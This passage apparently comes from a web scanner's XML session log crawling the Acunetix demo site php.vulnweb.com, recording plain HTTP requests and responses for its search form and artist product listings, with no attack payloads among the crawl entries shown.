Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="83F9EB317EE995AEC84659A28337077D";PSID="93D28727FA66621A9E828329B6210531";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="Relative";LinkKind="FormAction";Locations="HtmlNode";NodeName="form";Source="StaticParser";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="5c9aa26b";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="2995c044";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>search</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:48 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4732</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="38C2DF700D469FDA5789DFC101252DA0"><URL>http://php.vulnweb.com:80/listproducts.php?artist=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="38C2DF700D469FDA5789DFC101252DA0"><![CDATA[GET /listproducts.php?artist=1 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="38C2DF700D469FDA5789DFC101252DA0";PSID="7AB519E185B73A0122D4D701F8BD48B1";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="126695a8";
X-Request-Memo: ID="918f0a6e";sc="1";tid="39";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:49 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 7994

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>r4w8173</h2><div class='story'><a href='product.php?pic=1'><h3>The shore</h3></a><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=2'><h3>Mistery</h3></a><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a>Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=2','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=3'><h3>The universe</h3></a><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=3','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=4'><h3>Walking</h3></a><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=4','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=5'><h3>Mean</h3></a><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=5','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=6'><h3>Thing</h3></a><p><a href='showimage.php?file=./pictures/6.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/6.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="38C2DF700D469FDA5789DFC101252DA0"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="38C2DF700D469FDA5789DFC101252DA0";PSID="7AB519E185B73A0122D4D701F8BD48B1";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="126695a8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="918f0a6e";sc="1";tid="39";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>r4w8173</h2><div class='story'><a href='product.php?pic=1'><h3>The shore</h3></a><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=2'><h3>Mistery</h3></a><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a>Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=2','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=3'><h3>The universe</h3></a><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=3','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=4'><h3>Walking</h3></a><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=4','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=5'><h3>Mean</h3></a><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=5','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=6'><h3>Thing</h3></a><p><a href='showimage.php?file=./pictures/6.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/6.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=6','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:49 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>7994</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="576BAD0E7F0040BE9A90FAB7AD0E6559"><URL>http://php.vulnweb.com:80/listproducts.php?artist=2</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="576BAD0E7F0040BE9A90FAB7AD0E6559"><![CDATA[GET /listproducts.php?artist=2 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=2
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="576BAD0E7F0040BE9A90FAB7AD0E6559";PSID="C8A66BC9CE97EE743AAB0212AA76B188";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="d4bc8aad";
X-Request-Memo: ID="db313491";sc="1";tid="37";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:50 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5193

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Blad3</h2><div class='story'><a href='product.php?pic=7'><h3>Trees</h3></a><p><a href='showimage.php?file=./pictures/7.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/7.jpg&size=160' width='160' height='100'></a>bla bla bla</p><p>painted by: <a href='artists.php?artist=2'>Blad3</a></p><p><a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
